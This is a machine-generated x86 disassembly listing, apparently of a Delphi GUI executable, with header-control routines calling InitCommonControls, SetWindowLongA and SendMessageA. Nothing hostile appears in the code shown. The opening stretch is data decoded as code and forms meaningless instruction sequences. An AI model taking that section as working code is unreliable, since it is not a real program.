outsd
insb
outsd
jb r-xdata
add [ edi ] al
add bh bh
sbb al 0xd5
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
sub [ edx ] eax
or al 0x0
insb
outsd
jb r-xdata
insb
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] eax
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov esi ss
inc ebx
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
inc eax
add al cl
dec esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
dec edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x2500043 ] ch
add [ eax ] al
push esp
mov eax 0x1ae00044
inc edx
add ah ch
sub_43524c
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x3a ] ch
inc ebp
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ ecx + 0x43 ] cl
add ah bl
xor [ ebp ] eax
sbb dl ah
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ ecx ] bl
inc ebx
add al al
salc
inc ebx
add ah al
in al 0x43
add [ eax - 0x28 ] dh
inc ebx
add ah dh
in al 0x43
add [ eax ] ch
in eax 0x43
add ah dl
in eax 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2900040 ] dl
add [ eax ] al
add al 0x0
or eax 0x4eb00eb0
mov esp 0xe260ffb3
inc ebx
add [ eax - 0x5bffbc1e ] al
loop r-xdata
popad
add al bh
loope r-xdata
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi ] cl
push esp
inc esp
popad
je r-xdata
add [ gs : eax ] eax
test al 0xb7
inc esp
add [ edx + 0x1 ] ah
add bh bh
lodsb [ esi ]
insd
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
or al 0x0
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ eax ] al
add [ edi ] cl
add [ ecx ] cl
insb
inc ebp
jae r-xdata
inc ebx
add [ eax ] cl
inc ebx
outsd
push ebx
inc ebx
add [ edi ] al
andps xmm0 [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
adc al [ eax ]
or al 0x43
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
pushad
dec ebp
inc ebx
add [ eax ] cl
add al [ eax ]
dec [ eax ]
fld [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xfcff0001
insd
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jbe r-xdata
mov bh 0x44
add [ ebx + 0x1 ] ah
add bh bh
push 0x100456d
inc esp
insb
jae r-xdata
insd
inc ebx
je r-xdata
push eax
imul esp [ ebx + 0x6b ] 0x51f87265
inc ebx
add [ edi + ecx * 2 + r-xdata ] bh
or [ ebx + 0x6f ] al
push ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0xe6e4ff00
xor [ ecx + 0x740044 ] ch
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
or [ ebx + 0x61 ] eax
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
[ eax + 0x440044eb ]
add [ eax + 0x610044a8 ] cl
adc [ eax ] al
push edx
add al [ eax ]
push [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
push 0x656b6365
mov ah 0x29
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push [ eax ]
add dh bh
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jbe r-xdata
add [ ecx + eax ] ah
[ eax + 0x6d ]
mov bh 0x44
inc ebx
add [ ecx ] al
add [ eax ] al
insd
add [ gs : eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
in al 0xe6
imul ebp [ esi + 0x74 ] 0x44a82873
add ah ch
fadd [ ebx ]
sbb al 0xd9
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040015 ] al
popad
je r-xdata
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
push eax
inc ebx
add [ eax + 0x2 ] dl
insb
dec edi
jne r-xdata
outsd
js r-xdata
xchg esp eax
adc [ eax ] al
nop
add al [ eax ]
call [ eax + 0x10043e7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46060016 ] al
outsd
jb r-xdata
add bh bh
or al 0xe6
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] dh
add bh bh
hlt
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ 0x65420a00 ] cl
add [ ecx ] al
inc edx
jbe r-xdata
mov bh 0x44
add [ ebp + 0x1 ] ah
add bh bh
fsubr [ ebp + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
test al 0x44
add al bl
in al 0x43
add al bh
out 0x43 al
add [ ecx ] al
sub_435b18
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x5b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x280043 ] dl
add [ eax ] al
loopne r-xdata
add [ eax ] al
xchg esp eax
pop ebx
inc ebx
add [ eax ] ch
add [ eax ] al
add al ah
hlt
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + edx * 4 ] bh
inc ecx
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add al bl
out 0x43 eax
add al cl
add al [ ebx ]
mov [ ecx + eax * 2 + 0x43e8dc00 ] dl
add [ eax + ebp * 8 + 0x28c0043 ] cl
inc ebx
add [ eax + ebp * 8 ] ah
inc ebx
add [ eax - 0x18 ] bl
inc ebx
add [ eax + ebp * 8 - 0x1707ffbd ] ch
outsb
outsb
je r-xdata
je r-xdata
inc ebx
add [ ecx + ebp * 8 ] dl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
call 0xffffffffe93b5bd1
mov [ ebp ] 0xff000020
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
test al 0x5b
inc ebx
add [ edi ] al
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
in al dx
popad
jns r-xdata
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add al dh
jmp 0xffffffff9a3b5cf1
add [ eax - 0x1fffbd0a ] bh
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
xor al 0x40
add ah ch
fcomp [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ ebx + eax * 2 ]
sub [ eax ] al
add [ eax ] al
mov eax 0xe00042f6
insd
popad
dec ecx
outsb
js r-xdata
inc ebp
add [ eax + eax ] bl
add bh bh
insd
pushad
pop ebx
inc ebx
add [ ebp + esi * 8 + 0x42 ] bh
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
mov [ ebp ] 0xff00001c
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ esp + ebx * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
sub_435f02
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x44004468 ] dl
cmc
inc ebx
add [ eax + 0x60 ] ch
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add al al
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
add [ eax + 0x69 ] al
inc esp
add [ ecx + ebp * 2 + 0x44 ] ch
add ah dl
je r-xdata
rol [ edx ] cl
push 0x7000002
add [ eax + ebp * 2 + 0x44 ] ah
add ah bh
jae r-xdata
add bh ch
dec [ 0x4eb009b0 ]
add [ eax ] cl
je r-xdata
mov esp 0x201ffd9
mov ch 0xff
pushfd
hlt
mov al 0x9
mov al 0x4e
add [ esp + esi * 2 - 0x4fc3ffbc ] dl
inc ebp
add [ eax + ebp * 2 + 0x731c0044 ] dh
inc esp
add ah ah
imul eax [ eax + eax + 0x2c ] 0xfffffff4
inc ebx
add [ esi * 8 + 0x69e80043 ] bh
inc esp
add [ eax ] ah
hlt
sub_436100
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42a47c
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_43612c
push ebx
mov ebx eax
mov eax ebx
call sub_436100
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43618c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_456358
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_456054
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_456054
push eax
call SetWindowLongA
sub_4361d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_419304
mov eax esi
call sub_4362d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_436230
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418fac
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4363e0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_436408
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_4363b4
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_436390
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_436360
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_4363d0
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_436450
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4362d4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4034ac
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_4034ac
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4362a8
mov [ ebx + 0x25 ] 0x1
sub_43633c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_404100
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4193a8
sub_436370
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_4034ac
sub_4363e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_404100
xor edx edx
mov eax ebx
call sub_41936c
sub_436408
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_419390
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_419720
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_41936c
sub_436460
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4194e8
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4364c8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_436cd4
pop esi
pop ebx
retn
mov eax esi
call sub_419390
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_436cb0
pop esi
pop ebx
retn
sub_4364f4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_419720
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_419720
mov edi eax
dec edi
sub_436544
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451d80
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44ed68
mov edx 0x11
mov eax ebx
call sub_44f034
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4374f4
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_436614
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_4032b0
mov eax [ esi + 0x208 ]
call sub_4032b0
mov eax [ esi + 0x224 ]
call sub_4032b0
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
call sub_4032b0
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_43666c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_436100
mov edx esi
mov eax ebx
call sub_452ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_452e0c
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_4366e4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41964c
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43676c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41defc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41c5b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_436798
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45300c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436cd4
push ebp
call sub_4366e4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_45cbd0
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
pop edx
call sub_42a58c
pop ebx
pop ecx
pop ebp
retn
sub_436800
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43688e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41ea64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436895
mov eax [ ebp - 0x8 ]
call sub_4032b0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41ae88
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_4368a4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4553d0
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_4364b0
call sub_4362d4
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_4364b0
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_436900
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f258
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4364b0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_436460
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_436a4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4364b0
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a51
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_4364a4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4364b0
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_4364b0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_4364b0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_436a51
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_436cd4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_419720
mov edx eax
dec edx
mov eax ebx
call sub_4364b0
mov edx [ ebp - 0x8 ]
call sub_436408
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4364b0
mov edx [ ebp - 0xc ]
call sub_436408
sub_436aac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_425224
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_436b28
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_436bb4
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov esi eax
mov edx ecx
mov eax [ esi + 0x208 ]
call sub_4364b0
mov ebx eax
lea eax [ esp + 0x1 ]
xor ecx ecx
mov edx 0x24
call sub_402cc4
mov [ esp + 0x1 ] 0x7
mov eax [ ebx + 0x10 ]
mov [ esp + 0x5 ] eax
mov eax [ ebx + 0xc ]
call sub_40456c
mov [ esp + 0x9 ] eax
mov eax [ ebx + 0xc ]
call sub_40436c
mov [ esp + 0x11 ] eax
mov al [ ebx + 0x1c ]
mov [ esp ] al
mov eax ebx
call sub_436324
test al al
je r-xdata
mov al [ esp ]
sub al 0x1
jb r-xdata
mov eax esp
call sub_44c634
xor eax eax
mov [ esp + 0x15 ] eax
jmp r-xdata
je r-xdata
cmp [ ebx + 0x1d ] 0x1
jne r-xdata
mov [ esp + 0x15 ] 0x1
jmp r-xdata
jmp r-xdata
or [ esp + 0x15 ] 0x4000
or [ esp + 0x15 ] 0x8000
jmp r-xdata
mov [ esp + 0x15 ] 0x2
cmp [ esi + 0x228 ] 0x0
je r-xdata
or [ esp + 0x15 ] 0x4
mov eax ebx
call sub_43630c
test al al
je r-xdata
lea eax [ esp + 0x1 ]
push eax
mov eax ebx
call sub_419390
push eax
push edi
mov eax esi
call sub_456054
push eax
call SendMessageA
add esp 0x28
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
jl r-xdata
or [ esp + 0x1 ] 0x20
or [ esp + 0x15 ] 0x800
mov eax [ ebx + 0x20 ]
mov [ esp + 0x1d ] eax
sub_436cb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx 0x1204
mov eax ebx
call sub_436bb4
sub_436cd4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x210 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1200
mov eax esi
call sub_456054
push eax
call SendMessageA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x208 ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
inc ebx
xor edi edi
push 0x0
push 0x0
push 0x1202
mov eax esi
call sub_456054
push eax
call SendMessageA
dec ebx
jne r-xdata
mov ecx edi
mov edx 0x1201
mov eax esi
call sub_436bb4
inc edi
dec ebx
jne r-xdata
sub_436d50
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
